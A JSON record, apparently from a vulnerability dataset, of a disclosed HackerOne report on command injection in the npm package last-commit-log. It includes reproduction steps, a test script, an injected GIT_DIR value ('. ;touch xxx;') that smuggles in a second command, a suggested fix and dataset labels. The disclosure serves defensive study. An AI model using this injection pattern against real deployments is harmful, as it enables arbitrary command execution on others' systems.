@@ -1,0 +1,55 @@
+{
+  "reported_to": "Node.js third-party modules",
+  "reported_by": "bilk0h ",
+  "title": "[last-commit-log] Command Injection",
+  "content": "\nI would like to report Command Injection in last-commit-log\nIt allows execution of arbitrary commands\nModule\nmodule name: last-commit-log\nversion: last-commit-log@3.0.4\nnpm page: https://www.npmjs.com/package/last-commit-log\nModule Description\nNode.js module to get the last git commit information - mostly to be used by CI/CD and building phase.\nModule Stats\n[3,253] downloads in the last week\nVulnerability\nThe value of the GIT_DIR env variable is added to the command here on line 10 and here on line 25 and finally the command is executed on line 36.\nVulnerability Description\nSteps To Reproduce:\nnpm i last-commit-log\ncat > test.js\nconst LCL = require('last-commit-log');\nconst lcl = new LCL('.'); // or new LCL(dir) dir is process.cwd() by default\nlcl\n.getLastCommit()\n.then(commit => console.log(commit));\nExport malicious GIT_DIR string\nexport GIT_DIR=\". ;touch xxx;\"\nRun\nnode test.js\n<image_0>\nPatch\nFix: enclose --git-dir flag in quotes on line 10 like so\nthis.gitDirStr = GIT_DIR ? `--git-dir=\"${GIT_DIR}/.git\"` : '';\nSupporting Material/References:\n[OPERATING SYSTEM VERSION] Ubuntu 18.04.4 LTS\n[NODEJS VERSION] v14.0.0\n[NPM VERSION] 6.14.4\nWrap up\nI contacted the maintainer to let them know: [Y/N] No\nI opened an issue in the related repository: [Y/N] No\nImpact\nAbility to run any command available for attacker.\n\n",
+  "severity": [
+    7.0,
+    null
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {
+    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/yPUCbZfR6x6axN3v9rEuSEmA?response-content-disposition=attachment%3B%20filename%3D%22last-commit-log-demo.gif%22%3B%20filename%2A%3DUTF-8%27%27last-commit-log-demo.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYBJGSJK7%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T220001Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELb%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCv%2Be2T1AIkQdlPXtXgp%2F0bGuAwpi9T8hzQeK5QGDWMSgIhAMn79INyzwTy3L62BlB1SXq5sJr%2B3NRUcL%2FnynyKN%2B21KrEFCB8QAxoMMDEzNjE5Mjc0ODQ5IgwIxXsB2ijbNGYhcIYqjgXsyiyAnqy12uHuTgZ0ByDCsVc0MbzesaPq0KPcWUFbPKSUyhqx46KpZuZMf5Ljcs1qXCcra7Gc%2BD40kK8wrYRkSN7tPI4mBIh%2BLG8OcnUYAQ3c%2F1Ns6CfX1sZvIMYMpT4kVf%2BSvlleLewNBumbrclPEJ7QVu5Iu%2FmHDte9Lr3U38R3LwfhyrXBMAE0pKB%2FhGjQLu5ngPiRyvBp%2FXZe8MfZE%2Fbiynrln5Qg3BzY%2BWZc%2FTxkGHKKcSKlC%2BmKgYSjE8IKKsQPLcFvsNxYxuTy39%2FziTsozCNFNgYN%2BsegQzqLdvPGIIOHiJyy4pv5%2F4YRE9FPHkORU33%2F5lmJOGkEaOPLrtyxA%2BveL%2FEcF9jIR49wRuTWfCr1A4loSL0F3geeHqY4JDtrTJY%2BIEpNeDYlMBf%2Fbip0fhTmC6koTR4xvOm2p%2BjxhyiIqbGmun0Ranq07%2BGrT4ql81PKkerjNGZ2pRceh%2FSROe4WhQUkCHdA5wJEgRsiWYG8gtECkfCVHqs5FwiKmsVPncOTr6fvLCDnjD78B08HCl3qN9auc9Ss%2FkudNClmIfLHrw2X4pFPGqvyrXu1kDUqF7YQGF3bkkSYQOOTG7xA%2BTJV6pakrNGrloHs%2BPuySnNo%2B5WuFk0qTPgICu4viP%2F3cM3slEEbpm8ZGo1gKjvTeKjaXWhmMOszrWGvD58b94%2FDLsl7FaIZzUW%2BS6ZUIW0wtqq4q%2Bmj61s5b1Rs9N5tPvi9qh1PfWi6k531tVuRMIOL1PzOiKxgjggun%2BnJ6Tf%2FWvSNtS1xWXDW44yARzMLYXfhb0%2Bv4cMPdy%2B3nZs9nvesmA11WIkjGhIaC6qF3jAaYatiK1YRYNblWYOkVgkdsSyn8E4FuTaJkXww5L%2BMvwY6sAHeaPJtgsfRjiODK95fix%2BlMqsx1ecbZ5qTd3O5gA2OhQGeJXi2Q1icAkr61bUCKLCA39oMdg8p9tfOdcMjkeGVihR%2FUoi9QogE4Lh13ldQa5J2I1lLYXE%2BfULcC2G1O%2F759sRXNe54ZtkZxaSIM8U2JdYwhafrQfeCfjpDgMTztsamfVBfThkt56pYQq1RCAM2sJQ2H9yeTKAiNydAacYx0JD6agJ8XNRw2HAZOJl0jQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=f3711d82534cac24c7bb6344b30c41ad1d69ca2d9675dfdb53511be0321f394b"
+  },
+  "disclosed_date": 1606665960,
+  "report_url": "https://hackerone.com/reports/881713",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "HIGH",
+  "vuln_category": "CODE",
+  "steps": [
+    [
+      1,
+      "Install the vulnerable package: npm i last-commit-log"
+    ],
+    [
+      2,
+      "Create a test file (test.js) with the provided code snippet"
+    ],
+    [
+      3,
+      "Set a malicious environment variable: export GIT_DIR=\". ;touch xxx;\""
+    ],
+    [
+      4,
+      "Execute the test script: node test.js"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a command injection in the 'last-commit-log' npm package, where the GIT_DIR environment variable is used unsafely in a git command execution. This allows an attacker to inject arbitrary commands that will be executed in the context of the application.",
+  "reason": "The attack is straightforward, involving only the manipulation of an environment variable and understanding that it would be used unsafely in a command execution. There are no complex interactions or states to manipulate, and the vulnerability pattern (command injection via environment variables) is well-known in security contexts.",
+  "new_complexity": "LOW",
+  "requires_code": true,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": true
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command injection via environment variable manipulation (GIT_DIR), which is not related to authentication or authorization (AuthN/AuthZ) boundaries within an application. The proposed methodologies focus on testing user sessions, actions, and resource IDs within the same application context, not on environment variable injection or command execution vulnerabilities.",
+    "is_detectable": false
+  }
+}
